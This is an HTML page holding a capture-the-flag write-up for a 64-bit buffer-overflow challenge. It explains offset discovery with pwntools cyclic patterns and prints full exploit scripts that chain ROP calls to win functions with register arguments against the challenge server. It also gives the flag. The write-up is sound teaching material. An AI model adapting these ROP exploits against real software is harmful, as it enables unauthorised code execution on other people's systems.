<!DOCTYPE html>
<html lang="en-us" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Challenge:
64 bits in my Ark and Texture (300 points)
Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.
nc connect.umbccd.net 22237
Alongside this, we are provided with a binary file. When we execute the
file 3 basic questions about x86-64 appear.
Once we answer the first three questions (2, 1, 4), the first part of the real
challenge is proposed:
">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://pablo10diez2.github.io/docs/writeups/dawgctf/64-bits/">
  <meta property="og:site_name" content="Pablo Díez">
  <meta property="og:title" content="64 bits in my ark and texture">
  <meta property="og:description" content="Challenge: 64 bits in my Ark and Texture (300 points) Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation. nc connect.umbccd.net 22237
Alongside this, we are provided with a binary file. When we execute the file 3 basic questions about x86-64 appear. Once we answer the first three questions (2, 1, 4), the first part of the real challenge is proposed:">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2025-04-21T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-04-21T00:00:00+00:00">
    <meta property="article:tag" content="Buffer Overflow">
    <meta property="article:tag" content="Exploitation">
    <meta property="article:tag" content="Gdb">
<title>64 bits in my ark and texture | Pablo Díez</title>
<link rel="icon" href="/favicon.png" >
<link rel="manifest" href="/manifest.json">
<link rel="canonical" href="https://pablo10diez2.github.io/docs/writeups/dawgctf/64-bits/">
<link rel="stylesheet" href="/book.min.f1179be489a23e4d8fea3aec84b7f5a6d5b6470d1fc4df807bebdfea132a3a85.css" integrity="sha256-8Reb5ImiPk2P6jrshLf1ptW2Rw0fxN&#43;Ae&#43;vf6hMqOoU=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.87b51de7fe2e6fd34d8733bb9959121257c3d4dcfccc0184d5c7968f4c1dd402.js" integrity="sha256-h7Ud5/4ub9NNhzO7mVkSElfD1Nz8zAGE1ceWj0wd1AI=" crossorigin="anonymous"></script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr" class="book-kind-page book-type-docs">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    
<aside class="book-menu">
  <div class="book-menu-content">
    
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Pablo Díez</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>















  
  <ul>
    
      
        <li>
          
  
  

  
    <span>Writeups</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <span>L3ak Ctf</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/l3akctf/basiclll/" class="">BasicLLL</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/l3akctf/shirohero/" class="">Shiro Hero</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <span>Dawg Ctf</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/dawgctf/64-bits/" class="active">64 bits in my ark and texture</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/dawgctf/baby-rsa2/" class="">Baby-RSA 2</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/dawgctf/cantorspairadox/" class="">Cantors Pairadox</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <span>Projects</span>
  

          
  <ul>
    
      
    
  </ul>

        </li>
      
    
  </ul>














</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>



  </div>
</aside>
 

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <h3>64 bits in my ark and texture</h3>

  <label for="toc-control">
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents"></nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><p>Challenge:
<strong>64 bits in my Ark and Texture (300 points)
Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.
nc connect.umbccd.net 22237</strong></p>
<p>Alongside this, we are provided with a binary file. When we execute the
file 3 basic questions about x86-64 appear.
Once we answer the first three questions (2, 1, 4), the first part of the real
challenge is proposed:</p>
<p><img src="/images/questions.png" alt="Questions" /></p>
<p>They ask us to simply jump to a memory address, if we run this binary with
ghidra or binaryNinja (tools for analyzing compiled software) wen can see
the first vulnerability.</p>
<p><img src="/images/binary.png" alt="Binary" /></p>
<p>At the end of the main function we can see that is using fgets() to read the user input.
The problem is that is reading 0x200 bytes (0x200 in hexadecimal = 512 bytes) and storing
it in a variable buf. But since buf is defined as int64_t it means it can only store 8 bytes.</p>
<p>For later use keep in mind that the names of the functions we are going to use are:
-main
-win1
-win2
-win3
All of these can be seen when the binary is run with gdb, ghidra&hellip; They will make our life
easier since we will not have to deal with little/big endian.</p>
<p>This leads us to a buffer overflow vulnerability, since we can input more bytes than
the variable is able to deal with, we can overwrite memory addresses.
For us to make a call to another function we need to understand some basic things.</p>
<p>Once a function finishes it knows where to jump thanks to the return pointer (rsp), that stores
the address of the next function. That is to say that we need to find where the rsp is and overwrite
the address with the one we want.</p>
<p>So the first thing we need to know is how much data weneed to input before overwriting
this pointer. For this I&rsquo;m goint to be using gdb with pwn.</p>
<p>First we run in our terminal gdb ./chall, when we are alredy inside of pwndgb we can enter the
command run and answer the questions. Once we answer them we have to make a little script with
python that will allow as to know the number of character we need to introduce.</p>
<p>These 3 lines of code allow us to create a pattern, of length 200. Once we have that
we print it and copy it to out clipboard.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>pattern <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">200</span>)
</span></span><span style="display:flex;"><span>print(pattern<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><p>This will print something like: aabbacabwbbbcawewca&hellip; Which might seem random letters
but they do have a specific order.</p>
<p>Now we enter this pattern and see that the program failed, we accessed something that we
shouldn&rsquo;t in the memory and it broke. But if we scroll down a little bit we can see some
interesting report that pwndgb shows to us.</p>
<p><img src="/images/first.png" alt="Error" /></p>
<p>We can see the value of rsp with some letters that seem familiar, part of the pattern
we introduced.</p>
<p><img src="/images/error.png" alt="rsp" /></p>
<p>Now that we have this we can run another command with python. This will tell us
the number of letters we need to reach this part of the pattern. So if this prints
30 it means that we could inject 30 random letters and then after that we would be
overwriting the rsp.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(cyclic_find(<span style="color:#e6db74">&#34;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
</span></span></code></pre></div><p>And this prints 152, meaning that after 152 characters we can point to wherever we want and the program will
jump there.</p>
<p>We are going to use another python file to complete this task.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec to False</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to skip security checks if we already know the result</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (you can check manually with: checksec --file=./chall)</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools knows</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we are working with a 64-bit x86 binary</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># build the payload.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The payload is constructed locally using the ELF binary</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and then sent to the remote process. (Remember the statement)</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># before the return address</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the stack is 16-byte aligned before a function call).</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># crashes or undefined behavior.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span></code></pre></div><p>With this we can achieve what we wanted but is not enough now they ask us to do the following.</p>
<p><strong>You have passed the first challenge. The next one won&rsquo;t be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to
the temple of 0x401314 to claim your advance.DawgCTF{C0ngR4tul4t10ns_
Continue:</strong></p>
<p>We need to call another function but in this case with an argument. Now we need to understand how to call a function in this case.
Here comes to play the title of the challenge (64-bits).</p>
<p>Let&rsquo;s look at the image below, above the return pointer there are arguments from 7 to
n and below the pointer, the registers. When a function is called in 32 bit architecture all the arguments are passed directly to the stack.</p>
<p>But in this case we are working in a 64 bits architecture and when calling a function the first 6 parameters are stored in different registers.
That&rsquo;s why in the image the arguments start from the 7th.</p>
<p><img src="/images/stack.png" alt="stack" /></p>
<p>Now that we know this we can take a look at which are the registers that are used for the arguments. Since we are only going to need
1 argument we will use the first one, rdi.</p>
<p><img src="/images/registers.png" alt="registers" /></p>
<p>Before rewriting the script we need to understand this, once the first bufferoverflow is done calling win1 we can then concatenate the next payload. There
is no need to make another bufferoverflow and run them separately, since we are alredy stacking them in the stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec to False to skip security checks</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># if we already know the result (you can check manually in the terminal </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># with: checksec --file=./chall)</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools knows we are working with a 64-bit x86 binary</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to build the payload.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The payload is constructed locally using the ELF binary and then sent to the remote process.</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right before the return address</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures the stack is 16-byte aligned before a function call)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid crashes or undefined behavior.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 2 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Similar approach, but now we add the first function argument in the rdi register</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span></code></pre></div><p>Now we are presented with the last challenge.
<strong>You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and
[0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
d15c1p13_y0u_
Final Test:</strong></p>
<p>This is no different than the previous one, we just need to concatenate the 3 payloads and this is the final script. And like we
saw in a photo earlier we need the 3 register that pass the first 3 arguments, rdi, rsi and rdx.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to False to skip security checks if we already know</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the result (you can check manually with: checksec --file=./chall)</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># knows we are working with a 64-bit x86 binary</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#All three payloads will be executed in a row. This means</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we don’t need to perform three separate buffer overflows.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># After the first overflow, we can place all return addresses</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># on the stack, and they will be executed sequentially.That&#39;s</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># why we build everything together and send it in a single rop.chain() call.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to build</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the payload. The payload is constructed locally using the</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ELF binary and then sent to the remote process.</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># before the return address.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the stack is 16-byte aligned before a function call).</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># crashes or undefined behavior.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 2 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Similar approach, but now we add the first function</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># argument in the rdi register</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 3 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now we add values for rdi, rsi, and rdx registers</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for a function that expects three arguments</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeafface</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfeedcafe</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win3&#34;</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;exit&#34;</span>)  <span style="color:#75715e"># Graceful exit after payload</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the full payload chain</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Handle any final prompts and interaction</span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Continue:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Test:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span></code></pre></div><p><strong>Congratulations. You are deserving of you reward
4r3_r34dy_2_pwn!}</strong></p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>





  
  
  
  <div class="flex flex-wrap justify-between">
    <span>
